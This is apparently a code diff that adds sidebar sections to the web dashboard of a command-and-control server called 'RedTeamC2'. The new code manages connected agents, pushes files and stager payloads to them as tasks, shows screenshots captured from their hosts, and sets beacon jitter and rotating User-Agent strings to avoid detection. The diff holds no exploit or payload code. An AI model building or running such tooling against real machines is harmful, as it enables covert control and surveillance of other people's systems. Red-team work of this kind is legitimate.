@@ -183,16 +183,55 @@
     <div class="sidebar">
         <h1><i class="fa-solid fa-shield-halved"></i> RedTeamC2</h1>
         <nav>
-            <a href="#" class="active"><i class="fa-solid fa-users"></i> Agents</a>
-            <a href="#"><i class="fa-solid fa-file-arrow-up"></i> Files</a>
-            <a href="#"><i class="fa-solid fa-image"></i> Screenshots</a>
-            <a href="#"><i class="fa-solid fa-bolt"></i> Stager</a>
-            <a href="#"><i class="fa-solid fa-gear"></i> Settings</a>
+            <a href="#" class="active" data-section="agents"><i class="fa-solid fa-users"></i> Agents</a>
+            <a href="#" data-section="files"><i class="fa-solid fa-file-arrow-up"></i> Files</a>
+            <a href="#" data-section="screenshots"><i class="fa-solid fa-image"></i> Screenshots</a>
+            <a href="#" data-section="stager"><i class="fa-solid fa-bolt"></i> Stager</a>
+            <a href="#" data-section="settings"><i class="fa-solid fa-gear"></i> Settings</a>
         </nav>
     </div>
     <div class="main">
-        <h2 style="font-family: 'Orbitron', sans-serif; color: #00ffe7;">Agents</h2>
-        <div class="agents-grid" id="agents"></div>
+        <div id="agents-section">
+            <h2 style="font-family: 'Orbitron', sans-serif; color: #00ffe7;">Agents</h2>
+            <div class="agents-grid" id="agents"></div>
+            <div id="agents-empty" style="display:none;color:#888;margin-top:20px;">No agents connected.</div>
+        </div>
+        <div id="files-section" style="display:none">
+            <h2>Files</h2>
+            <form id="file-upload-form">
+                <input type="file" name="file" required>
+                <button type="submit">Upload File</button>
+            </form>
+            <ul id="files-list"></ul>
+            <div id="files-empty" style="display:none;color:#888;margin-top:20px;">No files uploaded.</div>
+        </div>
+        <div id="screenshots-section" style="display:none">
+            <h2>Screenshots</h2>
+            <div id="screenshots-list"></div>
+            <div id="screenshots-empty" style="display:none;color:#888;margin-top:20px;">No screenshots available.</div>
+        </div>
+        <div id="stager-section" style="display:none">
+            <h2>Stager</h2>
+            <form id="stager-upload-form">
+                <input type="file" name="payload" required>
+                <button type="submit">Upload Stager Payload</button>
+            </form>
+            <ul id="stager-list"></ul>
+            <div id="stager-empty" style="display:none;color:#888;margin-top:20px;">No stager payloads uploaded.</div>
+            <h3>Send Stager Task</h3>
+            <select id="stager-agent-select"></select>
+            <select id="stager-payload-select"></select>
+            <button onclick="sendStagerTask()">Send Stager</button>
+        </div>
+        <div id="settings-section" style="display:none">
+            <h2>Settings</h2>
+            <form onsubmit="saveSettings(event)">
+                <label>Jitter Min (s): <input id="jitter-min" type="number" min="1"></label><br>
+                <label>Jitter Max (s): <input id="jitter-max" type="number" min="1"></label><br>
+                <label>User-Agents (one per line):<br><textarea id="user-agents" rows="4" cols="40"></textarea></label><br>
+                <button type="submit">Save Settings</button>
+            </form>
+        </div>
     </div>
     <div class="results-modal" id="results-modal">
         <div class="results-content">
@@ -227,6 +266,7 @@
                 </div>`;
             }
             document.getElementById('agents').innerHTML = html;
+            document.getElementById('agents-empty').style.display = agents.length ? 'none' : 'block';
         }
         function sendTask(e, agent_id) {
             e.preventDefault();
@@ -252,9 +292,114 @@
         function closeModal() {
             document.getElementById('results-modal').classList.remove('active');
         }
-        socket.on('agent_update', data => renderAgents(data.agents));
+        socket.on('agent_update', data => { renderAgents(data.agents); updateStagerAgentSelect(data.agents); });
         socket.on('result_update', data => showResults(data.agent_id));
         fetch('/api/agents').then(r=>r.json()).then(renderAgents);
+        // Sidebar navigation
+        const sections = ['agents','files','screenshots','stager','settings'];
+        function showSection(section) {
+            for (const s of sections) {
+                document.getElementById(s+'-section').style.display = (s===section)?'block':'none';
+                document.querySelector(`.sidebar nav a[data-section="${s}"]`).classList.toggle('active', s===section);
+            }
+        }
+        document.querySelectorAll('.sidebar nav a').forEach(a=>{
+            a.onclick = e=>{e.preventDefault();showSection(a.dataset.section);};
+        });
+        // Files section
+        function loadFiles() {
+            fetch('/api/files').then(r=>r.json()).then(files=>{
+                let html = '';
+                for (const f of files) html += `<li>${f} <a href="/uploads/${f}" target="_blank">Download</a> <button onclick="deleteFile('${f}')">Delete</button> <button onclick="sendFileToAgent('${f}')">Send to Agent</button></li>`;
+                document.getElementById('files-list').innerHTML = html;
+                document.getElementById('files-empty').style.display = files.length ? 'none' : 'block';
+            });
+        }
+        document.getElementById('file-upload-form').onsubmit = function(e) {
+            e.preventDefault();
+            const form = new FormData(e.target);
+            fetch('/api/upload_file', {method:'POST', body:form}).then(()=>loadFiles());
+        };
+        function deleteFile(f) {
+            fetch('/api/delete_file', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:f})}).then(()=>loadFiles());
+        }
+        function sendFileToAgent(f) {
+            const agentId = prompt('Send to which agent ID?');
+            if (agentId) fetch('/api/task', {method:'POST',body:new URLSearchParams({agent_id:agentId,cmd:`download|${f}`})});
+        }
+        // Screenshots section
+        function loadScreenshots() {
+            fetch('/api/screenshots').then(r=>r.json()).then(shots=>{
+                let html = '';
+                for (const s of shots) html += `<a href="#" onclick="viewScreenshot('${s}');return false;"><img src="/screenshots/${s}" style="max-width:120px;max-height:90px;margin:6px;border:2px solid #00ffe7;border-radius:8px;box-shadow:0 0 8px #00ffe7a0;"></a> <button onclick="deleteScreenshot('${s}')">Delete</button>`;
+                document.getElementById('screenshots-list').innerHTML = html;
+                document.getElementById('screenshots-empty').style.display = shots.length ? 'none' : 'block';
+            });
+        }
+        function viewScreenshot(s) {
+            const modal = document.createElement('div');
+            modal.style.position = 'fixed';modal.style.top=0;modal.style.left=0;modal.style.right=0;modal.style.bottom=0;modal.style.background='rgba(24,28,36,0.95)';modal.style.zIndex=1000;modal.innerHTML = `<img src="/screenshots/${s}" style="max-width:90vw;max-height:80vh;display:block;margin:40px auto;"><button onclick="this.parentNode.remove()" style="display:block;margin:20px auto;">Close</button>`;
+            document.body.appendChild(modal);
+        }
+        function deleteScreenshot(s) {
+            fetch('/api/delete_screenshot', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filename:s})}).then(()=>loadScreenshots());
+        }
+        // Stager section
+        function loadStagerList() {
+            fetch('/api/stager_list').then(r=>r.json()).then(list=>{
+                let html = '';
+                for (const name of list) html += `<li>${name} <button onclick="deleteStager('${name}')">Delete</button></li>`;
+                document.getElementById('stager-list').innerHTML = html;
+                document.getElementById('stager-empty').style.display = list.length ? 'none' : 'block';
+                // update stager payload select
+                let sel = document.getElementById('stager-payload-select');
+                sel.innerHTML = '';
+                for (const name of list) sel.innerHTML += `<option value="${name}">${name}</option>`;
+            });
+        }
+        document.getElementById('stager-upload-form').onsubmit = function(e) {
+            e.preventDefault();
+            const form = new FormData(e.target);
+            fetch('/api/stager_upload', {method:'POST', body:form}).then(()=>loadStagerList());
+        };
+        function deleteStager(name) {
+            fetch('/api/stager_delete', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name})}).then(()=>loadStagerList());
+        }
+        function sendStagerTask() {
+            const agentId = document.getElementById('stager-agent-select').value;
+            const payload = document.getElementById('stager-payload-select').value;
+            fetch('/api/task', {method:'POST',body:new URLSearchParams({agent_id:agentId,cmd:`stager|${payload}`})});
+            alert('Stager task sent!');
+        }
+        // Update agent select for stager
+        function updateStagerAgentSelect(agents) {
+            let sel = document.getElementById('stager-agent-select');
+            sel.innerHTML = '';
+            for (const agent of agents) sel.innerHTML += `<option value="${agent.id}">${agent.id}</option>`;
+        }
+        // Settings section
+        function loadSettings() {
+            fetch('/api/settings').then(r=>r.json()).then(s=>{
+                document.getElementById('jitter-min').value = s.jitter_min;
+                document.getElementById('jitter-max').value = s.jitter_max;
+                document.getElementById('user-agents').value = s.user_agents.join('\n');
+            });
+        }
+        function saveSettings(e) {
+            e.preventDefault();
+            const data = {
+                jitter_min: parseInt(document.getElementById('jitter-min').value),
+                jitter_max: parseInt(document.getElementById('jitter-max').value),
+                user_agents: document.getElementById('user-agents').value.split('\n')
+            };
+            fetch('/api/settings', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).then(()=>alert('Settings saved!'));
+        }
+        // On load
+        showSection('agents');
+        loadFiles();
+        loadScreenshots();
+        loadStagerList();
+        loadSettings();
     </script>
 </body>
 </html> 
